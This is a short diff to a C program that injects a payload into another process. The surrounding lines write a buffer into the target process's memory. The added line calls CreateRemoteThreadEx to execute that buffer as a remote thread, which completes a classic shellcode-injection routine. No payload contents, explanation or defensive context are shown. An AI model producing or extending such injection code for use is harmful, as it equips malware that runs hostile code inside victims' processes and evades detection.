@@ -37,7 +37,7 @@ int main(int argc, char* argv[])
     WriteProcessMemory(hProcess, rBuffer, payload, payloadSize, NULL);
     printf("Payload written to the process memory");
 
-
+    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);
 
     return EXIT_SUCCESS;
 }
